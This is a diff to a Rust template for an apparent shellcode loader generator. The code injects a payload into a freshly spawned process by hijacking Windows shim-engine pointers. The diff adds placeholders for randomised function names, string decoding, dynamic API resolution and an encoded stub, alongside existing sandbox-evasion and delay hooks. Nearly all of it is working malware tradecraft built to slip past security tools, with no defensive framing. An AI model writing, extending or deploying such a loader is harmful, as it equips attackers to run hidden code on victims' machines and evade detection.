@@ -25,14 +25,18 @@ use windows_sys::core::s;
 mod core_file;
 mod stubs;
 
-use core_file::{encode_system_ptr, find_pattern, find_se_dll_loaded, find_shims_enabled};
-use stubs::STUB;
+use core_file::{{{FN_ENC_PTR}}, find_se_dll_loaded, find_shims_enabled};
+use stubs::{STUB, STUB_PLACEHOLDER_OFFSET};
 
 {{IMPORTS}}
 
 {{SANDBOX_IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
+
+{{STR_DECODER}}
+
+{{API_RESOLVER}}
 
 fn wipe(buf: &mut Vec<u8>) {
     for b in buf.iter_mut() {
@@ -41,13 +45,13 @@ fn wipe(buf: &mut Vec<u8>) {
     buf.clear();
 }
 
-// Called by {{NT_DELAY_*}} placeholders when the nt_delay evasion is selected.
+// Called by the NT_DELAY placeholders when the nt_delay evasion is selected.
 #[allow(dead_code)]
-fn pause(ms: u64) {
+fn {{FN_PAUSE}}(ms: u64) {
     std::thread::sleep(std::time::Duration::from_millis(ms));
 }
 
-unsafe fn cascade(shellcode: &[u8], target_process: &[u8]) {
+unsafe fn {{FN_CASCADE}}(shellcode: &[u8], target_process: &[u8]) {
     let si = zeroed::<STARTUPINFOA>();
     let mut pi = zeroed::<PROCESS_INFORMATION>();
 
@@ -116,8 +120,8 @@ unsafe fn cascade(shellcode: &[u8], target_process: &[u8]) {
     let stub_addr = remote_mem as u64;
     let shell_addr = stub_addr + STUB.len() as u64;
 
-    let placeholder = find_pattern(STUB, &[0x11; 8]).unwrap_or(0);
-    let mut patched_stub = STUB.to_vec();
+    let mut patched_stub: Vec<u8> = {{FN_DECODER}}(STUB);
+    let placeholder = STUB_PLACEHOLDER_OFFSET;
     patched_stub[placeholder..placeholder + 8]
         .copy_from_slice(&shims_enabled.to_le_bytes());
 
@@ -137,7 +141,7 @@ unsafe fn cascade(shellcode: &[u8], target_process: &[u8]) {
         null_mut(),
     );
 
-    let encoded_ptr = encode_system_ptr(stub_addr);
+    let encoded_ptr = {{FN_ENC_PTR}}(stub_addr);
     WriteProcessMemory(
         pi.hProcess,
         se_dll_loaded as _,
@@ -175,7 +179,7 @@ fn main() {
 
     // Process name must be NUL-terminated for CreateProcessA.
     let target = b"{{TARGET_PROCESS}}\0";
-    unsafe { cascade(&vec, target); }
+    unsafe { {{FN_CASCADE}}(&vec, target); }
     wipe(&mut vec);
 }
 
